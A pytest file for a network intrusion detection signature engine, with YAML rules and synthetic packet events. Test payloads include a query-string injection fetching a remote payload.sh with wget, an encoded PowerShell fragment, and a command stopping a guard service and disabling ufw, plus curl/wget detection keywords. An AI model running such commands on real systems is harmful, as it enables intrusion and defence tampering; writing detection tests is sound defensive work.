from pathlib import Path

from src.NIDS.detect.signature import SignatureEngine


def test_signature_payload_match(tmp_path: Path) -> None:
    rules_path = tmp_path / "rules.yml"
    rules_path.write_text(
        """
- name: Suspicious Payload
  match:
    proto: TCP
    dst_ports: [443]
    payload_contains: ["powershell"]
  severity: high
""",
        encoding="utf-8",
    )

    engine = SignatureEngine(rules_path)
    event = {
        "proto": "TCP",
        "src_ip": "10.0.0.1",
        "dst_ip": "8.8.8.8",
        "src_port": 52525,
        "dst_port": 443,
        "payload": b"GET / HTTP/1.1\r\nHost: test\r\n\r\npowershell -enc AAA",
    }

    alerts = engine.detect(event, {})
    assert len(alerts) == 1
    assert alerts[0]["severity"] == "high"


def test_signature_payload_match_linux_loader_token(tmp_path: Path) -> None:
    rules_path = tmp_path / "rules.yml"
    rules_path.write_text(
        """
- name: Suspicious Payload
  match:
    proto: TCP
    dst_ports: [8080]
    payload_contains: ["curl", "wget"]
  severity: high
""",
        encoding="utf-8",
    )

    engine = SignatureEngine(rules_path)
    event = {
        "proto": "TCP",
        "src_ip": "10.0.0.1",
        "dst_ip": "10.0.0.30",
        "src_port": 52525,
        "dst_port": 8080,
        "payload": b"GET /update?cmd=wget%20http://198.51.100.10/payload.sh HTTP/1.1\r\nHost: test\r\n\r\n",
    }

    alerts = engine.detect(event, {})
    assert len(alerts) == 1
    assert alerts[0]["rule_name"] == "Suspicious Payload"


def test_signature_http_method_match_nonstandard_port(tmp_path: Path) -> None:
    rules_path = tmp_path / "rules.yml"
    rules_path.write_text(
        """
- name: Suspicious HTTP Keyword
  match:
    proto: TCP
    http_methods: ["GET"]
    payload_contains: ["wget"]
  severity: high
""",
        encoding="utf-8",
    )

    engine = SignatureEngine(rules_path)
    event = {
        "proto": "TCP",
        "src_ip": "10.0.0.1",
        "dst_ip": "10.0.0.30",
        "src_port": 52525,
        "dst_port": 31337,
        "http_method": "GET",
        "http_uri": "/update?cmd=wget",
        "payload": b"GET /update?cmd=wget HTTP/1.1\r\nHost: test\r\n\r\n",
    }

    alerts = engine.detect(event, {})
    assert len(alerts) == 1
    assert alerts[0]["rule_name"] == "Suspicious HTTP Keyword"


def test_signature_dns_match(tmp_path: Path) -> None:
    rules_path = tmp_path / "rules.yml"
    rules_path.write_text(
        """
- name: DNS Indicator
  match:
    proto: UDP
    dns_qnames: ["evil.example"]
  severity: medium
""",
        encoding="utf-8",
    )

    engine = SignatureEngine(rules_path)
    event = {
        "proto": "UDP",
        "src_ip": "10.0.0.1",
        "dst_ip": "1.1.1.1",
        "src_port": 53000,
        "dst_port": 53,
        "payload": b"",
        "dns_qname": "api.evil.example",
    }

    alerts = engine.detect(event, {})
    assert len(alerts) == 1
    assert alerts[0]["rule_name"] == "DNS Indicator"


def test_signature_linux_defense_tamper_http_post(tmp_path: Path) -> None:
    rules_path = tmp_path / "rules.yml"
    rules_path.write_text(
        """
- name: Linux Defense Tamper Command
  match:
    proto: TCP
    http_methods: ["POST"]
    payload_contains: ["ufw disable", "systemctl stop"]
  severity: high
""",
        encoding="utf-8",
    )

    engine = SignatureEngine(rules_path)
    event = {
        "proto": "TCP",
        "src_ip": "10.77.0.20",
        "dst_ip": "10.77.0.30",
        "src_port": 54000,
        "dst_port": 8080,
        "http_method": "POST",
        "http_uri": "/ops/maintenance",
        "payload": (
            b"POST /ops/maintenance HTTP/1.1\r\n"
            b"Host: 10.77.0.30\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            b"command=sudo systemctl stop guard.service; sudo ufw disable"
        ),
    }

    alerts = engine.detect(event, {})
    assert len(alerts) == 1
    assert alerts[0]["rule_name"] == "Linux Defense Tamper Command"


def test_signature_linux_archive_exfiltration_http_post(tmp_path: Path) -> None:
    rules_path = tmp_path / "rules.yml"
    rules_path.write_text(
        """
- name: Linux Archive Exfiltration
  match:
    proto: TCP
    http_methods: ["POST"]
    http_uris: ["/upload/archive-exfil"]
    payload_contains: ["content-disposition: attachment", "staged_loot.tar.gz", "x-exfil-intent: staged-archive"]
  severity: high
""",
        encoding="utf-8",
    )

    engine = SignatureEngine(rules_path)
    event = {
        "proto": "TCP",
        "src_ip": "10.77.0.20",
        "dst_ip": "10.77.0.30",
        "src_port": 54001,
        "dst_port": 8080,
        "http_method": "POST",
        "http_uri": "/upload/archive-exfil",
        "payload": (
            b"POST /upload/archive-exfil HTTP/1.1\r\n"
            b"Host: 10.77.0.30\r\n"
            b"Content-Type: application/octet-stream\r\n"
            b"Content-Disposition: attachment; filename=staged_loot.tar.gz\r\n"
            b"X-Exfil-Intent: staged-archive\r\n\r\n"
        ),
    }

    alerts = engine.detect(event, {})
    assert len(alerts) == 1
    assert alerts[0]["rule_name"] == "Linux Archive Exfiltration"
